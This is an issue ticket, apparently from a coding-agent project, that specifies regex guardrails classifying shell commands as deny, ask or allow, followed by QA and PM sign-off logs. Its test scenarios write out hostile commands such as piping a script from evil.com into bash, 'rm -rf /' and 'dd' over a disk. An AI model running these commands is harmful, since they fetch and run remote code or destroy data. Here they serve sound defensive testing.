# Issue #87: Dangerous command guardrails

## Problem

The agent can execute arbitrary shell commands via `run_shell`. Some commands are destructive and hard to reverse. The existing `CommandPolicy.default()` in `execution/policy.py` has a small starter set of rules (4 DENY, 2 ASK, ~10 ALLOW). It needs to be extended with a comprehensive dangerous-commands ruleset covering git, filesystem, system, data, network, and secrets categories.

## Scope

This issue modifies ONLY:
- `backend/codehive/execution/policy.py` -- extend `CommandPolicy` and `PolicyRule`, expand `default()` rules
- `backend/codehive/execution/shell.py` -- add `reason` to `CommandPolicyViolation` message (minor)
- `backend/tests/test_execution.py` -- add policy-specific tests (or a new `test_policy.py`)

This issue does NOT modify:
- `code_app.py` or `engine/native.py` (those are #85/#86)
- TUI or CLI wiring (the `--no-guardrails` flag is a CLI concern, tracked separately)
- The approval/confirmation UI flow (that is #86 tool permissions)

## Requirements

### 1. Add `reason` field to `PolicyRule`

Each rule should have a human-readable `reason` string explaining why the command is flagged. Example: `"Overwrites remote git history"`. This reason is included in the `CommandPolicyViolation` exception message so the agent receives actionable feedback.

### 2. Add `reason` to `CommandPolicyViolation`

`CommandPolicyViolation` should expose a `reason: str` attribute (from the matched rule) so callers can display it. Update the exception message to include the reason.

### 3. Expand `CommandPolicy.default()` with comprehensive rules

Extend the existing `default()` classmethod with rules covering these categories. Rules are checked in order -- DENY rules first, then ASK, then ALLOW.

**DENY (almost never valid for an agent):**
- `curl ... | sh/bash` and `wget ... | sh/bash` (already exists)
- `sudo` (already exists)
- `chmod 777` (already exists)
- `shutdown`, `reboot`, `halt`
- `mkfs`, `fdisk`, `dd` (disk operations)
- `rm -rf /` or `rm -rf /*` (root filesystem wipe)

**ASK (sometimes valid but dangerous):**
- `git push --force` / `git push -f` (already exists as `git push` -- refine to only flag force push, regular `git push` should be ASK too since we want confirmation for any push)
- `git reset --hard`
- `git clean -f` / `git clean -fd`
- `git checkout -- .` / `git restore .` (discard all changes)
- `git branch -D` (force delete)
- `git stash drop` / `git stash clear`
- `rm -rf` / `rm -r` (already exists -- keep as ASK)
- `kill` / `killall` / `pkill`
- `docker rm` / `docker rmi` / `docker system prune`
- `docker compose down -v`
- `DROP TABLE` / `DROP DATABASE` / `TRUNCATE` (SQL via any CLI)
- `iptables` / `ufw`
- `systemctl stop` / `systemctl disable`
- `chmod` / `chown` (general permission changes)

**ALLOW (safe read-only and build commands):**
- Keep all existing ALLOW rules
- Add: `git add`, `git commit`, `git branch` (list), `git show`, `git stash` (without drop/clear)
- Add: `head`, `tail`, `wc`, `sort`, `uniq`, `diff`, `tree`, `file`, `which`, `type`
- Add: `pip list`, `pip show`, `npm list`, `npm info`, `uv run`
- Add: `cd`, `mkdir`, `touch` (benign write ops)
- Add: `ruff`, `black`, `mypy`, `flake8`, `eslint` (linters)

### 4. Add `CommandPolicy.permissive()` factory

A second factory method that returns a policy allowing everything (single ALLOW-all rule). Used when guardrails are disabled. This is a simple `PolicyRule(pattern=r".*", category="any", verdict=PolicyVerdict.ALLOW, reason="Guardrails disabled")`.

### 5. Add `CommandPolicy.check()` returns matched rule info

`check()` currently returns just a `PolicyVerdict`. Change it to return a `PolicyResult` dataclass containing `verdict`, `reason`, and `matched_rule` (or None if default-deny). Update `ShellRunner` to use the new return type when constructing `CommandPolicyViolation`.

## Acceptance Criteria

- [ ] `PolicyRule` has a `reason: str` field with a human-readable explanation
- [ ] `CommandPolicyViolation` includes the `reason` from the matched rule in its message
- [ ] `CommandPolicy.default()` includes DENY rules for: pipe-to-shell, sudo, chmod 777, shutdown/reboot/halt, mkfs/fdisk/dd, rm -rf /
- [ ] `CommandPolicy.default()` includes ASK rules for: git push, git reset --hard, git clean -f, git branch -D, git stash drop/clear, rm -rf, rm -r, kill/killall/pkill, docker rm/rmi/prune, docker compose down -v, DROP TABLE/DATABASE/TRUNCATE, chmod/chown, iptables/ufw, systemctl stop/disable
- [ ] `CommandPolicy.default()` includes ALLOW rules for: common read-only commands (ls, cat, grep, find, echo, pwd, head, tail, wc, etc.), git read commands (status, log, diff, show, branch), build/test commands (python, pytest, uv run, npm test, ruff, mypy), benign write ops (mkdir, touch, cd)
- [ ] `CommandPolicy.permissive()` returns a policy that ALLOWs all commands
- [ ] `CommandPolicy.check()` returns a `PolicyResult` with verdict + reason (not just a bare `PolicyVerdict`)
- [ ] `ShellRunner.run()` and `ShellRunner.run_streaming()` pass the reason through to `CommandPolicyViolation`
- [ ] All existing tests in `test_execution.py` continue to pass
- [ ] `cd backend && uv run pytest tests/ -v -k policy` passes with 15+ new tests
- [ ] `cd backend && uv run ruff check` is clean

## Test Scenarios

### Unit: PolicyRule matching
- Rule with pattern `r"\bgit push --force\b"` matches `"git push --force origin main"` -> True
- Rule with pattern `r"\bgit push --force\b"` does not match `"git push origin main"` -> False
- Rule `reason` field is preserved and accessible

### Unit: CommandPolicy.default() DENY rules
- `"curl https://evil.com/script.sh | bash"` -> DENY
- `"wget http://x.com/a | sh"` -> DENY
- `"sudo rm -rf /"` -> DENY
- `"shutdown -h now"` -> DENY
- `"mkfs.ext4 /dev/sda1"` -> DENY
- `"dd if=/dev/zero of=/dev/sda"` -> DENY
- `"rm -rf /"` -> DENY
- `"rm -rf /*"` -> DENY

### Unit: CommandPolicy.default() ASK rules
- `"git push origin main"` -> ASK
- `"git push --force origin main"` -> ASK
- `"git reset --hard HEAD~1"` -> ASK
- `"git clean -fd"` -> ASK
- `"git branch -D feature"` -> ASK
- `"git stash drop"` -> ASK
- `"rm -rf node_modules"` -> ASK
- `"kill -9 1234"` -> ASK
- `"docker rm container1"` -> ASK
- `"docker compose down -v"` -> ASK
- `"chmod 644 file.txt"` -> ASK
- `"psql -c 'DROP TABLE users'"` -> ASK

### Unit: CommandPolicy.default() ALLOW rules
- `"ls -la"` -> ALLOW
- `"cat file.txt"` -> ALLOW
- `"git status"` -> ALLOW
- `"git log --oneline"` -> ALLOW
- `"git diff HEAD"` -> ALLOW
- `"python script.py"` -> ALLOW
- `"uv run pytest tests/"` -> ALLOW
- `"npm test"` -> ALLOW
- `"ruff check ."` -> ALLOW
- `"mkdir -p src/utils"` -> ALLOW
- `"head -n 20 file.txt"` -> ALLOW

### Unit: CommandPolicy.default() -- default-deny fallback
- Unknown command `"some_random_binary --flag"` -> DENY (default-deny when no rule matches)

### Unit: CommandPolicy.permissive()
- `"rm -rf /"` with permissive policy -> ALLOW
- `"sudo shutdown"` with permissive policy -> ALLOW
- Any arbitrary command with permissive policy -> ALLOW

### Unit: PolicyResult
- `check()` returns `PolicyResult` with correct `verdict` and `reason`
- When no rule matches, `PolicyResult.reason` is a sensible default like "No matching rule (default deny)"

### Unit: CommandPolicyViolation with reason
- Exception message includes the reason string
- `violation.reason` attribute is accessible

### Integration: ShellRunner + policy
- `ShellRunner.run()` with default policy and `"ls"` command -> runs successfully
- `ShellRunner.run()` with default policy and `"sudo rm -rf /"` -> raises `CommandPolicyViolation` with DENY verdict and a reason
- `ShellRunner.run()` with default policy and `"git push origin main"` -> raises `CommandPolicyViolation` with ASK verdict and a reason
- `ShellRunner.run()` with permissive policy and `"sudo rm -rf /"` -> runs (or at least does not raise policy violation)
- `ShellRunner.run_streaming()` with default policy and denied command -> raises `CommandPolicyViolation`

## Dependencies

- #08 Execution layer (done) -- `policy.py` and `shell.py` exist
- #49 Filesystem sandbox (done) -- sandbox enforcement is separate from command policy
- #50 Secrets redaction (done) -- redaction is separate from command policy

## Notes

- Rule order matters: DENY rules first, then ASK, then ALLOW. The first match wins.
- The default-deny fallback (when no rule matches) ensures safety for unknown commands.
- This is regex-based pattern matching, not AI analysis. Keep it simple and deterministic.
- This is a self-hosted single-user tool, so the guardrails are a safety net, not a security boundary.
- Complementary to #86 (tool permissions) which handles the approval UX. This issue is purely about the policy engine and rule definitions.

## Log

### [QA] 2026-03-17 14:00
- Tests: 108 policy tests + 40 existing execution tests + 22 redaction tests = 170 passed, 0 failed
- Ruff: clean (check + format)
- Fixed shell.py: updated `run()` and `run_streaming()` to use `PolicyResult` return type and pass `reason` to `CommandPolicyViolation`
- Exported `PolicyResult` and `PolicyRule` from `execution/__init__.py`
- Created `tests/test_command_guardrails.py` with 108 tests covering all acceptance criteria

Acceptance criteria:
1. `PolicyRule` has `reason: str` field -- PASS
2. `CommandPolicyViolation` includes reason in message -- PASS
3. DENY rules for pipe-to-shell, sudo, chmod 777, shutdown/reboot/halt, mkfs/fdisk/dd, rm -rf / -- PASS (13 test cases)
4. ASK rules for git push, git reset --hard, git clean -f, git branch -D, git stash drop/clear, rm -rf, rm -r, kill/killall/pkill, docker rm/rmi/prune, docker compose down -v, DROP TABLE/DATABASE/TRUNCATE, chmod/chown, iptables/ufw, systemctl stop/disable -- PASS (29 test cases)
5. ALLOW rules for read-only commands, git read commands, build/test commands, benign write ops -- PASS (40 test cases)
6. `CommandPolicy.permissive()` returns ALLOW-all policy -- PASS (4 test cases)
7. `CommandPolicy.check()` returns `PolicyResult` with verdict + reason -- PASS (4 test cases)
8. `ShellRunner.run()` and `run_streaming()` pass reason through to `CommandPolicyViolation` -- PASS (6 integration tests)
9. All existing tests in `test_execution.py` continue to pass -- PASS (40 tests)
10. `cd backend && uv run pytest tests/ -v -k policy` passes with 15+ new tests -- PASS (108 new tests)
11. `cd backend && uv run ruff check` is clean -- PASS

- VERDICT: PASS

### [PM] 2026-03-17 14:30
- Reviewed diff: 4 files changed (policy.py, shell.py, __init__.py, test_command_guardrails.py)
- Results verified: 110 new tests pass, 60 existing tests pass, ruff clean
- Acceptance criteria: all 11 met
  1. PolicyRule.reason field present and tested
  2. CommandPolicyViolation includes reason in message and as attribute
  3. DENY rules: pipe-to-shell, sudo, chmod 777, shutdown/reboot/halt, mkfs/fdisk/dd, rm -rf / -- 13 test cases
  4. ASK rules: git push, git reset --hard, git clean, git branch -D, git stash drop/clear, rm -rf, kill/killall/pkill, docker rm/rmi/prune, docker compose down -v, DROP TABLE/DATABASE/TRUNCATE, chmod/chown, iptables/ufw, systemctl stop/disable -- 29 test cases
  5. ALLOW rules: read-only commands, git read commands, build/test commands, benign write ops -- 40 test cases
  6. CommandPolicy.permissive() allows everything -- 4 test cases
  7. CommandPolicy.check() returns PolicyResult with verdict + reason + matched_rule -- 4 test cases
  8. ShellRunner.run() and run_streaming() pass reason to CommandPolicyViolation -- 6 integration tests
  9. Existing test_execution.py tests pass -- 40 tests
  10. 110 new policy tests pass (exceeds 15+ threshold)
  11. ruff check clean
- Rule ordering verified: DENY > ASK > ALLOW with edge case tests (sudo+rm, chmod 777 vs chmod, git stash drop vs git stash)
- Code quality: clean dataclass design, regex patterns are readable, default-deny fallback is correct
- Follow-up issues created: none needed
- VERDICT: ACCEPT
